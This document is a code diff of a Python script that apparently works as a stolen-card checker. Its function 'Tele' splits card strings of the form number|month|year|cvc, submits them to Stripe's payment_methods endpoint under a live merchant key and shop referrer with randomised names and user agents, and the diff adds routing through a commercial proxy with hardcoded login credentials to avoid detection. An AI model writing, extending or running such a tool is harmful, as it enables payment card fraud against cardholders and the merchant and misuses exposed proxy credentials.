@@ -2,10 +2,9 @@ import random
 import string
 import requests
 from user_agent import generate_user_agent
+from proxy import reqproxy, make_request
 import json
 import re
-
-session = requests.Session()
 
 #============================================
 def generate_full_name():
@@ -35,6 +34,9 @@ def generate_random_code(length=32):
 
 #============================================
 def Tele(ccx):
+    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
+    session, ip = reqproxy(proxy_str)
+    #print(f"IP Address: {ip}")
     ccx=ccx.strip()
     n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
@@ -166,7 +168,7 @@ def Tele(ccx):
     
     data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&payment_user_agent=stripe.js%2Fc30beb05a2%3B+stripe-js-v3%2Fc30beb05a2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheblacksheepshop.in&time_on_page=47455&client_attribution_metadata[client_session_id]=57ca1ad5-64b2-4914-9786-6868d8c0d050&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1XWrzijx1Am&client_attribution_metadata[elements_session_config_id]=dc45afad-5700-490d-8ecd-4e28ddc5c537&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51PySNkCdnuLfrUleTNJPo8KexXRjjnsDtIpJzva5xH09kZoz4xALflAPSUaXe83dWHnmSsF6PoNlDijA7aaqo7fc00fjCniU0Y&_stripe_version=2024-06-20'
     
-    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
     pm = response.json()['id']
     print(pm)
